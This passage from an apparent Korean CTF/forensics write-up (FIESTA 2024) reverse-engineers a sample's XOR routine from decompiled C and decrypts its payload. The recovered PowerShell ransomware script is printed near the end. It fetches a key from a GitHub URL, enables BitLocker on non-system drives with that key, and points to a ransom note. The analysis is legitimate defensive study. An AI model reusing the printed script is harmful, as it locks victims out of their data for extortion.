    <span class="p">{</span>
      <span class="k">do</span>
      <span class="p">{</span>
        <span class="n">v9</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">Block_0_ptr</span><span class="p">[</span><span class="n">v6</span><span class="p">];</span>
        <span class="n">v10</span> <span class="o">=</span> <span class="n">str_special</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">str_special</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mh">0xFu</span> <span class="p">)</span>
          <span class="n">v10</span> <span class="o">=</span> <span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="n">str_special</span><span class="p">;</span>
        <span class="n">v11</span> <span class="o">=</span> <span class="n">v6</span> <span class="o">%</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">Block_ptr</span><span class="p">;</span>
        <span class="o">++</span><span class="n">v6</span><span class="p">;</span>
        <span class="o">*</span><span class="n">v9</span> <span class="o">^=</span> <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">v10</span> <span class="o">+</span> <span class="n">v11</span><span class="p">);</span>
        <span class="n">Block_1_ptr</span> <span class="o">=</span> <span class="n">Block</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
        <span class="n">Block_0_ptr</span> <span class="o">=</span> <span class="n">Block</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
      <span class="p">}</span>
      <span class="k">while</span> <span class="p">(</span> <span class="n">v6</span> <span class="o">&lt;</span> <span class="n">Block</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="n">Block</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">);</span>
    <span class="p">}</span>
    <span class="n">sub_402540</span><span class="p">(</span><span class="n">Block_0_ptr</span><span class="p">,</span> <span class="n">Block_1_ptr</span> <span class="o">-</span> <span class="n">Block_0_ptr</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">sub_404130</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v21</span><span class="p">[</span><span class="mi">4</span><span class="p">])</span> <span class="p">)</span>
      <span class="n">sub_401D40</span><span class="p">(</span>
        <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">v21</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v21</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)),</span>
        <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v21</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v21</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span><span class="p">))</span> <span class="o">|</span> <span class="p">(</span><span class="mi">4</span> <span class="o">*</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v21</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v21</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
                                                       <span class="o">+</span> <span class="mi">2</span><span class="p">),</span>
        <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">sub_404130</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v22</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="p">)</span>
      <span class="n">sub_401D40</span><span class="p">(</span>
        <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">v22</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v22</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)),</span>
        <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v22</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v22</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span><span class="p">))</span> <span class="o">|</span> <span class="p">(</span><span class="mi">4</span> <span class="o">*</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v22</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v22</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
                                                       <span class="o">+</span> <span class="mi">2</span><span class="p">),</span>
        <span class="mi">0</span><span class="p">);</span>
    <span class="n">LOBYTE</span><span class="p">(</span><span class="n">v25</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">v12</span> <span class="o">=</span> <span class="n">Block</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">Block</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v24</span> <span class="o">-</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">Block</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="mh">0x1000</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">v12</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="p">((</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">Block</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(</span><span class="n">Block</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="n">v12</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mh">0x1F</span> <span class="p">)</span>
          <span class="n">_invalid_parameter_noinfo_noreturn</span><span class="p">();</span>
      <span class="p">}</span>
      <span class="n">sub_4068E5</span><span class="p">(</span><span class="n">v12</span><span class="p">);</span>
      <span class="n">Block</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="n">Block</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
      <span class="n">v24</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">v13</span> <span class="o">=</span> <span class="n">sub_404E00</span><span class="p">();</span>
    <span class="n">sub_4050B0</span><span class="p">(</span><span class="n">v13</span><span class="p">);</span>
  <span class="p">}</span>                                             <span class="c1">// 여기에서부터는 파일 입출력 수행</span>
  <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">v22</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v22</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span><span class="p">))</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">ofstream</span><span class="o">::</span><span class="err">`</span><span class="n">vftable</span><span class="err">'</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v21</span><span class="p">[</span><span class="mi">45</span><span class="p">]</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v22</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span><span class="p">))</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v22</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">-</span> <span class="mi">104</span><span class="p">;</span>
  <span class="n">sub_403300</span><span class="p">();</span>
  <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">v22</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v22</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span><span class="p">))</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">ostream</span><span class="o">::</span><span class="err">`</span><span class="n">vftable</span><span class="err">'</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v21</span><span class="p">[</span><span class="mi">45</span><span class="p">]</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v22</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span><span class="p">))</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v22</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">-</span> <span class="mi">8</span><span class="p">;</span>
  <span class="n">LOBYTE</span><span class="p">(</span><span class="n">v25</span><span class="p">)</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
  <span class="n">v22</span><span class="p">[</span><span class="mi">26</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">ios_base</span><span class="o">::</span><span class="err">`</span><span class="n">vftable</span><span class="err">'</span><span class="p">;</span>
  <span class="n">std</span><span class="o">::</span><span class="n">ios_base</span><span class="o">::</span><span class="n">_Ios_base_dtor</span><span class="p">((</span><span class="k">struct</span> <span class="n">std</span><span class="o">::</span><span class="n">ios_base</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v22</span><span class="p">[</span><span class="mi">26</span><span class="p">]);</span>
  <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">v21</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v21</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span><span class="p">))</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">ifstream</span><span class="o">::</span><span class="err">`</span><span class="n">vftable</span><span class="err">'</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v21</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v21</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span><span class="p">))</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v21</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">-</span> <span class="mi">112</span><span class="p">;</span>
  <span class="n">sub_403300</span><span class="p">();</span>
  <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">v21</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v21</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span><span class="p">))</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">istream</span><span class="o">::</span><span class="err">`</span><span class="n">vftable</span><span class="err">'</span><span class="p">;</span>
  <span class="o">*</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v21</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v21</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span><span class="p">))</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v21</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">-</span> <span class="mi">24</span><span class="p">;</span>
  <span class="n">v25</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
  <span class="n">v21</span><span class="p">[</span><span class="mi">28</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">&amp;</span><span class="n">std</span><span class="o">::</span><span class="n">ios_base</span><span class="o">::</span><span class="err">`</span><span class="n">vftable</span><span class="err">'</span><span class="p">;</span>
  <span class="n">std</span><span class="o">::</span><span class="n">ios_base</span><span class="o">::</span><span class="n">_Ios_base_dtor</span><span class="p">((</span><span class="k">struct</span> <span class="n">std</span><span class="o">::</span><span class="n">ios_base</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v21</span><span class="p">[</span><span class="mi">28</span><span class="p">]);</span>
<span class="p">}</span>

</code></pre></div></div> <p><br /></p> <p>해당 함수 내부를 보면 좀 많이 어려워 보인다.</p> <p>굳이 전체를 이해할 필요 없이 핵심 동작을 수행하는 곳이 어딘지부터 알아내 보자고</p> <p>원래 논문도 핵심부터 읽는 거고</p> <p>코드도 핵심부터 거꾸로 읽는 거지</p> <p><br /></p> <p>먼저 해당 프로그램이 있던 깃허브 레포를 보면, XOR을 수행하는 프로그램이라 되어 있다.</p> <p>그렇다면, 난독화가 안 걸려 있거나 좀 정직하게 쓰인 프로그램이라면 높은 확률로 <code class="language-plaintext highlighter-rouge">^</code> 기호가 등장하는 곳이 주요 행위를 수행하는 부분이 될 것이다.</p> <p>암호화에 주로 사용되는 연산을 난독화하는 기법에 대해선 다음 포스팅에 다뤄보는 것도 좋겠다.</p> <p><br /></p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2036.png" alt="image.png" width="80%" height="80%" /></p> <p>아 대박 진짜 있네</p> <p><br /></p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">if</span> <span class="p">(</span> <span class="n">Block</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="n">Block</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">do</span>
      <span class="p">{</span>
        <span class="n">v9</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">Block_0_ptr</span><span class="p">[</span><span class="n">v6</span><span class="p">];</span>
        <span class="n">v10</span> <span class="o">=</span> <span class="n">str_special</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">str_special</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mh">0xFu</span> <span class="p">)</span>
          <span class="n">v10</span> <span class="o">=</span> <span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="n">str_special</span><span class="p">;</span>
        <span class="n">v11</span> <span class="o">=</span> <span class="n">v6</span> <span class="o">%</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">Block_ptr</span><span class="p">;</span>
        <span class="o">++</span><span class="n">v6</span><span class="p">;</span>
        <span class="o">*</span><span class="n">v9</span> <span class="o">^=</span> <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">v10</span> <span class="o">+</span> <span class="n">v11</span><span class="p">);</span>
        <span class="n">Block_1_ptr</span> <span class="o">=</span> <span class="n">Block</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
        <span class="n">Block_0_ptr</span> <span class="o">=</span> <span class="n">Block</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
      <span class="p">}</span>
      <span class="k">while</span> <span class="p">(</span> <span class="n">v6</span> <span class="o">&lt;</span> <span class="n">Block</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="n">Block</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">);</span>
    <span class="p">}</span>
</code></pre></div></div> <p>이 부분이 핵심인가보다.</p> <p><br /></p> <p>내가 생각하는 게 맞는지 ChatGPT에게 물어봤다.</p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2037.png" alt="image.png" width="80%" height="80%" /></p> <p>맞다고 함</p> <p>그럼 이 안에서 사용되는 주요 변수가 무엇일지 알아내 보자.</p> <p>? 평문으로 들어가는 데이터가 없는 것 같음.</p> <p>그럼 뭐…. bp걸고 동적으로 분석해야지…</p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2038.png" alt="image.png" width="80%" height="80%" /></p> <p><br /></p> <p><code class="language-plaintext highlighter-rouge">kernalbase.dll</code>, <code class="language-plaintext highlighter-rouge">kernalbase32.dll</code> 에서 <code class="language-plaintext highlighter-rouge">IsDebuggerPresent</code>를 Import하긴 하는데</p> <p>왜인진 몰라도 안티디버깅이 안 터짐 ㅋㅋㅋㅋㅋ아뭐지</p> <p><br /></p> <p>어쨌든 루프 내부로 진입해 xor 당시 <code class="language-plaintext highlighter-rouge">lock.ps1</code>을 가지고 key값과 xor 해준다는 사실을 알 수 있었다</p> <p><code class="language-plaintext highlighter-rouge">lock.ps1</code>이 없으면 실행 플로우의 문제로 판단하고 강제 종료하는 루틴이 있기 때문에 a로만 채운 <code class="language-plaintext highlighter-rouge">lock.ps1</code>을 넣어줬고</p> <p><br /></p> <p>이제 암호화로 뭐가 들어가고 그 결과로 뭐가 나오는지 알았다.</p> <p>그리고 암호화를 하기 위해 참조하는 데이터는 내부에 hard-coded되어있는 파일명임을 또한 알았다.</p> <p>마지막으로 암호화 루틴의 핵심은 XOR이며, XOR을 하기 전후에 딱히 데이터에 대한 비트 연산도 없다.</p> <p><br /></p> <p>XOR을 통해 만들어진 암호문은 동일 루틴을 통과할 경우 입력값이었던 평문을 그대로 도출할 수 있다.</p> <p>블록 암호화를 위한 대칭키 알고리즘이 많지만, 복호화 알고리즘은 내가 아는 한 블록을 trimming해서 key와 매칭시키는 위상만 역으로 재현할 뿐이지 복호화 수식 자체는 암호화 수식과 동일하다.</p> <p><br /></p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">v6</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">LOBYTE</span><span class="p">(</span><span class="n">v25</span><span class="p">)</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
    <span class="n">Block_1_ptr</span> <span class="o">=</span> <span class="n">Block</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
    <span class="n">Block_0_ptr</span> <span class="o">=</span> <span class="n">Block</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
    <span class="n">Block_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="n">str_special</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">Block</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="n">Block</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">do</span>
      <span class="p">{</span>
        <span class="n">v9</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">Block_0_ptr</span><span class="p">[</span><span class="n">v6</span><span class="p">];</span>
        <span class="n">v10</span> <span class="o">=</span> <span class="n">str_special</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">str_special</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mh">0xFu</span> <span class="p">)</span>
          <span class="n">v10</span> <span class="o">=</span> <span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="n">str_special</span><span class="p">;</span>
        <span class="n">v11</span> <span class="o">=</span> <span class="n">v6</span> <span class="o">%</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">Block_ptr</span><span class="p">;</span>
        <span class="o">++</span><span class="n">v6</span><span class="p">;</span>
        <span class="o">*</span><span class="n">v9</span> <span class="o">^=</span> <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">v10</span> <span class="o">+</span> <span class="n">v11</span><span class="p">);</span>
        <span class="n">Block_1_ptr</span> <span class="o">=</span> <span class="n">Block</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
        <span class="n">Block_0_ptr</span> <span class="o">=</span> <span class="n">Block</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
      <span class="p">}</span>
      <span class="k">while</span> <span class="p">(</span> <span class="n">v6</span> <span class="o">&lt;</span> <span class="n">Block</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="n">Block</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">);</span>
    <span class="p">}</span>
    <span class="n">sub</span>
</code></pre></div></div> <p><br /></p> <p>그리고 여기에서 봤을 때, XOR을 위해 block을 trimming 하는 부분에서는 key string에 1:1 매핑을 하기 위해 mod 연산으로 input block을 key string의 길이만큼씩 잘라 각 블록의 앞에서부터 순서대로 key와 XOR을 하는 것 이외의 위상 변화가 없다.</p> <p>즉, 해당 루틴의 I/O는 대칭이라고 결론지었다.</p> <p><br /></p> <p>그럼 내가 굳이 복호화를 위한 harness를 만들 필요가 없지 않을까?</p> <ul> <li> <p>앞서 말한 대칭성 하에서 Input으로 평문 <code class="language-plaintext highlighter-rouge">lock.ps1</code>을 넣어 Output으로 암호화된 <code class="language-plaintext highlighter-rouge">lock_encrypted.ps1</code>이 나왔다면</p> </li> <li> <p>Input으로 암호문 <code class="language-plaintext highlighter-rouge">lock_encrypted.ps1</code>을 넣었을 때 Output으로 복호화된 <code class="language-plaintext highlighter-rouge">lock.ps1</code>을 도출할 테니까</p> </li> <li> <p>그래서 암호문 <code class="language-plaintext highlighter-rouge">lock_encrypted.ps1</code>의 파일명을 <code class="language-plaintext highlighter-rouge">lock.ps1</code>으로 바꾸고, <code class="language-plaintext highlighter-rouge">enc.exe</code>를 실행했다.</p> </li> </ul> <p>물론 <code class="language-plaintext highlighter-rouge">enc.exe</code>를 끝까지 실행하면 vm에 BitLocker가 걸리기 때문에 ㅋㅋㅋㅋㅋ 그리고 <code class="language-plaintext highlighter-rouge">lock.ps1</code>을 지우는 스크립트인 <code class="language-plaintext highlighter-rouge">wiping.ps1</code>이 실행될 것이므로…</p> <p>복호화만 완료시키고 강제종료 시켜줬다.</p> <p><br /></p> <p>그 결과,</p> <p><img src="/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2039.png" alt="image.png" width="80%" height="80%" /></p> <p><br /></p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># lock.ps1</span><span class="w">

</span><span class="n">Start-Process</span><span class="w"> </span><span class="nx">powershell</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="s2">"-NoProfile -ExecutionPolicy Bypass -Command &amp; { </span><span class="nv">$scriptBlock</span><span class="s2"> }"</span><span class="w"> </span><span class="nt">-WindowStyle</span><span class="w"> </span><span class="nx">Hidden</span><span class="w">
</span><span class="n">Set-ExecutionPolicy</span><span class="w"> </span><span class="nx">Bypass</span><span class="w"> </span><span class="nt">-Scope</span><span class="w"> </span><span class="nx">LocalMachine</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="nv">$rawUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"https://raw.githubusercontent.com/imnothackerkkk/key/main/secret"</span><span class="p">;</span><span class="w"> 
</span><span class="nv">$fileContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Invoke-RestMethod</span><span class="w"> </span><span class="nt">-Uri</span><span class="w"> </span><span class="nv">$rawUrl</span><span class="w">
</span><span class="nv">$volumes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-BitLockerVolume</span><span class="w">
</span><span class="nv">$osVolume</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nx">Win32_OperatingSystem</span><span class="p">)</span><span class="o">.</span><span class="nf">SystemDrive</span><span class="w">
</span><span class="nv">$key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="nt">-String</span><span class="w"> </span><span class="nv">$fileContent</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="kr">foreach</span><span class="w"> </span><span class="p">(</span><span class="nv">$volume</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$volumes</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$volume</span><span class="o">.</span><span class="nf">MountPoint</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="nv">$osVolume</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="n">Enable-BitLocker</span><span class="w"> </span><span class="nt">-MountPoint</span><span class="w"> </span><span class="nv">$volume</span><span class="o">.</span><span class="nf">MountPoint</span><span class="w"> </span><span class="nt">-EncryptionMethod</span><span class="w"> </span><span class="nx">Aes128</span><span class="w"> </span><span class="nt">-PasswordProtector</span><span class="w"> </span><span class="nv">$key</span><span class="w">
	</span><span class="n">Disable-BitLockerAutoUnlock</span><span class="w"> </span><span class="nt">-MountPoint</span><span class="w"> </span><span class="nv">$volume</span><span class="o">.</span><span class="nf">MountPoint</span><span class="w">
        </span><span class="nx">Get-BitLockerVolume</span><span class="w"> </span><span class="nt">-MountPoint</span><span class="w"> </span><span class="nv">$volume</span><span class="o">.</span><span class="nf">MountPoint</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="nv">$Url1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"https://raw.githubusercontent.com/imnothackerkkk/key/main/ransomnote.jpg"</span><span class="w">
